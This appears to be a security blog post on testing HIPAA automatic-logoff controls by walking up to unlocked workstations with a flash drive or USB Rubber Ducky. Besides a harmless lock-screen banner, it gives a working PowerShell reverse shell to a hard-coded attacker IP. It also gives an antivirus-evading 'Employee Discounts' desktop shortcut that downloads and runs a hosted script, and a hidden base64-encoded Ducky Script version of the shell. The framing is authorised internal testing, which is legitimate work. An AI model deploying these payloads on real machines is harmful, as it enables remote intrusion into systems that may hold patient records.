# Are your session timeouts effective?

## HIPAA Security Rule
If you've been exposed to HIPAA, then you've no doubt come across the section of automatic logoffs. The basis of this control is to ensure that if a user happens to forget to lock or log out of their session or a computer, a technical control will ensure it's locked out before any unauthorized access is to occur.

Let's take a quick look at the security rule: 

## AUTOMATIC LOGOFF (A) - § 164.312(a)(2)(iii)

> Where this implementation specification is a reasonable and appropriate safeguard for a covered entity, the covered entity must: 
> “Implement electronic procedures that terminate an electronic session after a predetermined time of inactivity.” 

https://www.hhs.gov/sites/default/files/ocr/privacy/hipaa/administrative/securityrule/techsafeguards.pdf?language=es

I want to focus a bit on the comment _"predetermined time of inactivity"_. You need to weigh the security benefits to the overall strategy of the system you're trying to protect. Is it a publicly accessible system, such as machines outside patient rooms or a kiosk? Or is it a system that provides access to medical records in a badge access imaging reading room? Regardless, you also need to be aware of whether your policy is just _compliant_ or if it's _compliant and effective_.

Let's say you currently have a session timeout of 3 hours across the board to simplify administrative upkeep across all your client systems. Under the current language, this would make you compliant, but is this really an effective security control? What if you have single sign-on configured and the wrong person finds a system unlocked? 

## Penetration Test

What we'll do for this security control is complete various walkthroughs to find unlocked workstations and attempt to execute one of three payloads I'll show below, from a flash drive or rubber ducky before they lock out. If you're reading this thinking that you block read access to unapproved flash drives, well, then you may need to keep on reading, especially if you haven't heard of a rubber ducky.

## Payload Descriptions

### Awareness Banners

This script will open notepad with our message at full screen and lock the PC for us. Security awareness banners are great, non-intrusive reminders to lock your workstation before you walk away. Keep in mind the type of message you're trying to send with these tests. The last thing we want to do is risk the leaders getting complaints that we're sending out pizza requests or love letters from unlocked machines. 

**Remember, we will ultimately need their buy in if we find the policy is not effective and we need to change it.**

### Reverse Shell

This is a reverse shell script that will dynamically try to connect to the ip address/port that we designate, ultimately our attacker machine back in the office. This script is a little heavier than the traditional one-line powershell script to prevent the need to have multiple scripts for every listening port we configure.

Let's say you find a workstation unlocked on your network that is physically accessible to the public, this could show that someone with malicious intent could get a connection to your network, especially if other proper controls aren't in place. What if a more sensitive machine was left physically available? This is where you can really test out your social engineering skills; try to tailgate into a badge-only area.

### Planted Shortcut

Here we are going to drop a payload in the form of a shortcut on the machine that will download and execute the content of a script we're hosting. A lot of anti-virus products will detect and block shortcuts that utilize Invoke-Expression in conjunction with New-Object, so with this payload we're adding a simple layer of obfuscation to bypass it. Make sure to test in your environment and tweak as needed.

During an actual pen test engagement, this is not going to be realistic, however, if you're performing these tests for your own organization then you will have the benefit of time. Plus, this is a good security awareness opportunity to train staff to not click on unfamiliar icons on the desktop.

## Rubber Ducky vs Flash Drive

There are two strategies used here, both will get the end result but will take advantage of different scenarios. With a regular flash drive, we simply just need to store our scripts and execute them after we plug in the drive. What if you have an organization that doesn't allow unauthorized flash drives? This could mean many things, but if you have good controls, you will block the ability to read/write to unauthorized devices. However, this isn't going to stop everything. 

With a Rubber Ducky, it looks like a flash drive, however, when you connect it to a computer, it's seen as a keyboard and simply executes keystrokes for us. All we'll need to do is create our Ducky Script, encode it and walk up to a machine and plug it in, wait a second and walk away. If you allow USB Keyboards, you'll allow this device.

## Payload Content

### PowerShell Scripts

*Awareness Banner*

```Powershell
$Banner = @'
//////////////////////////////////////////////////////////////////////////////////
//              W       A       R       N       I       N       G               //
//////////////////////////////////////////////////////////////////////////////////

Do not forget to lock your PC before you walk away by pressing WINDOWS + L.

    - Information Security 

'@

$Banner | Out-File $env:userprofile/Desktop/lock_your_pc.txt
Start-Process notepad $env:userprofile/Desktop/lock_your_pc.txt -WindowStyle Maximized
Invoke-Command {rundll32.exe user32.dll,LockWorkStation}
```

*Reverse Shell*

```Powershell
$Ports = '1111', '2222', '3333'
$Target = '192.168.209.130'

ForEach ($T in $Target)
{
	ForEach ($P in $Ports)
	{
		Write-Output "[*] Contacting $($T+':'+$P)"
		Try
		{
			$client = New-Object System.Net.Sockets.TCPClient($T, $P);
			$stream = $client.GetStream();
			[byte[]]$bytes = 0 .. 65535 | %{ 0 };
			while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
			{
				$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
				$sendback = (iex $data 2>&1 | Out-String)
				$sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
				$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
				$stream.Write($sendbyte, 0, $sendbyte.Length)
				$stream.Flush()
			}
			$client.Close()
		}
		Catch
		{
			If ($($_.Exception.Message) -like "*actively refused*")
			{
				Write-Output '[!] Failed..Trying next'
			}
			Else
			{
                         	Write-Output $_.Exception.Message
			}
		}
	}
} 
```

*Planted Shortcut*

```Powershell
$Target = 'http://192.168.209.130/rev.ps1'
$Payload = @" 
-command "& {New-Alias 'IS' New-Object; iex (IS System.Net.WebClient).DownloadString('$Target');Remove-Item alias:\IS}"
"@

$Shell = New-Object -ComObject ("WScript.Shell")
$Shortcut = $Shell.CreateShortcut($env:USERPROFILE + "\Desktop\Employee Discounts.lnk")
$Shortcut.TargetPath="%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe"
$Shortcut.Arguments="$Payload"
$Shortcut.WindowStyle = 2;
$Shortcut.Description = "Employee Discounts";
$Shortcut.IconLocation = "C:\Program Files\Internet Explorer\iexplore.exe"
$Shortcut.Save()
```

### Ducky Scripts

The Rubber Ducky uses a simple scripting language called Ducky Script to carry on our attacks. You can use only your keyboard to carry on your attack, then you can likely convert that workflow to Ducky Script. Once you get your Ducky Script, you must encode it and move the inject.bin to the root of the Micro SD card. 

To show the simplicity, the below Ducky Script will open notepad and type 'Hello World'.

```
REM Hello World
DELAY 1000
GUI r
DELAY 100
STRING C:\windows\notepad.exe
ENTER
DELAY 1000
STRING Hello World
```
Even with Ducky Script, writing the above PowerShell scripts will be a pain to compose and troubleshoot. However, we can take advantage of PowerShell Encoded Commands to convert our script to one line. This will make it much easier to compose to Ducky Script, for example:

```PowerShell
$command = @'
$Ports = '1111', '2222', '3333'
$Target = '192.168.209.130'

ForEach ($T in $Target)
{
	ForEach ($P in $Ports)
	{
		Write-Output "[*] Contacting $($T+':'+$P)"
		Try
		{
			$client = New-Object System.Net.Sockets.TCPClient($T, $P);
			$stream = $client.GetStream();
			[byte[]]$bytes = 0 .. 65535 | %{ 0 };
			while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
			{
				$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
				$sendback = (iex $data 2>&1 | Out-String)
				$sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
				$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
				$stream.Write($sendbyte, 0, $sendbyte.Length)
				$stream.Flush()
			}
			$client.Close()
		}
		Catch
		{
			If ($($_.Exception.Message) -like "*actively refused*")
			{
				Write-Output '[!] Failed..Trying next'
			}
			Else
			{
                Write-Output $_.Exception.Message
			}
		}
	}
} 
'@

$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
Write-Output "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc -encodedCommand $encodedCommand"
```

Resulting in:

```
REM Reverse Shell
DELAY 1000
GUI r
DELAY 100
STRING C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe
ENTER
DELAY 1000
STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Enc 'JABQAG8AcgB0AHMAIAA9ACAAJwAxADEAMQAxACcALAAgACcAMgAyADIAMgAnACwAIAAnADMAMwAzADMAJwANAAoAJABUAGEAcgBnAGUAdAAgAD0AIAAnADEAOQAyAC4AMQA2ADgALgAyADAAOQAuADEAMwAwACcADQAKAA0ACgBGAG8AcgBFAGEAYwBoACAAKAAkAFQAIABpAG4AIAAkAFQAYQByAGcAZQB0ACkADQAKAHsADQAKAAkARgBvAHIARQBhAGMAaAAgACgAJABQACAAaQBuACAAJABQAG8AcgB0AHMAKQANAAoACQB7AA0ACgAJAAkAVwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAFsAKgBdACAAQwBvAG4AdABhAGMAdABpAG4AZwAgACQAKAAkAFQAKwAnADoAJwArACQAUAApACIADQAKAAkACQBUAHIAeQANAAoACQAJAHsADQAKAAkACQAJACQAYwBsAGkAZQBuAHQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAkAFQALAAgACQAUAApADsADQAKAAkACQAJACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AA0ACgAJAAkACQBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAgAC4ALgAgADYANQA1ADMANQAgAHwAIAAlAHsAIAAwACAAfQA7AA0ACgAJAAkACQB3AGgAaQBsAGUAIAAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkADQAKAAkACQAJAHsADQAKAAkACQAJAAkAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABpACkADQAKAAkACQAJAAkAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwApAA0ACgAJAAkACQAJACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwANAAoACQAJAAkACQAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQANAAoACQAJAAkACQAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAgADAALAAgACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQANAAoACQAJAAkACQAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQANAAoACQAJAAkAfQANAAoACQAJAAkAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkADQAKAAkACQB9AA0ACgAJAAkAQwBhAHQAYwBoAA0ACgAJAAkAewANAAoACQAJAAkASQBmACAAKAAkACgAJABfAC4ARQB4AGMAZQBwAHQAaQBvAG4ALgBNAGUAcwBzAGEAZwBlACkAIAAtAGwAaQBrAGUAIAAiACoAYQBjAHQAaQB2AGUAbAB5ACAAcgBlAGYAdQBzAGUAZAAqACIAKQANAAoACQAJAAkAewANAAoACQAJAAkACQBXAHIAaQB0AGUALQBPAHUAdABwAHUAdAAgACcAWwAhAF0AIABGAGEAaQBsAGUAZAAuAC4AVAByAHkAaQBuAGcAIABuAGUAeAB0ACcADQAKAAkACQAJAH0ADQAKAAkACQAJAEUAbABzAGUADQAKAAkACQAJAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAVwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUADQAKAAkACQAJAH0ADQAKAAkACQB9AA0ACgAJAH0ADQAKAH0AIAA='
ENTER
```

## Attacker Machine

![Alt text](https://github.com/gh0x0st/HIPAA-Automatic-Logoff/blob/master/Screenshots/Listener_Snippet.png?raw=true "Listener_Snippet")

Setting up our attacker machine is going to be easy, you simply need to setup listeners on your machine. Depending on how many unlocked workstations you're expecting to find, you need to ensure you have enough listeners, depending on what your goal is. 

![Alt text](https://github.com/gh0x0st/HIPAA-Automatic-Logoff/blob/master/Screenshots/HTTP_Snippet.png?raw=true "HTTP_Snippet.png")

For the instance of the planted shortcut and you're hosting a payload, you can also do this easily from Kali. Just make sure your script is good to go and you can spin up a web server using Python.

## Recommendations

You will never truly know how effective your security controls are unless you put them to the test. Compliance to a HIPAA guideline does not necessary equate to security. If you’re in charge of securing sensitive data, this is an important concept to make sure you and your stakeholders understand. In Cyber Security, we’re generally advisers, and advising risk doesn’t mean much if you don’t have data to support your initiative.

With this particular control, take the time to see if you feel your lockout settings are appropriate. If you’re unsure, test them.

1. Determine what type of payload you want (awareness banners are a good place to start)
2. Generate your scripts
3. If using a Rubber Ducky, think of everything you can do with a keyboard, then translate that that into your plan
   Keystroke > Ducky Script > Encode > Profit
4. Test your scripts
5. Perform a walkthrough
6. Report the results

Be informed, be secure!


## Resources
* Kali Linux - https://www.kali.org/
* Rubber Ducky - https://shop.hak5.org/products/usb-rubber-ducky-deluxe
* Ducky Script - https://docs.hak5.org/hc/en-us/articles/360010555153-Ducky-Script-the-USB-Rubber-Ducky-language
* Rubber Ducky Encoder - https://ducktoolkit.com/
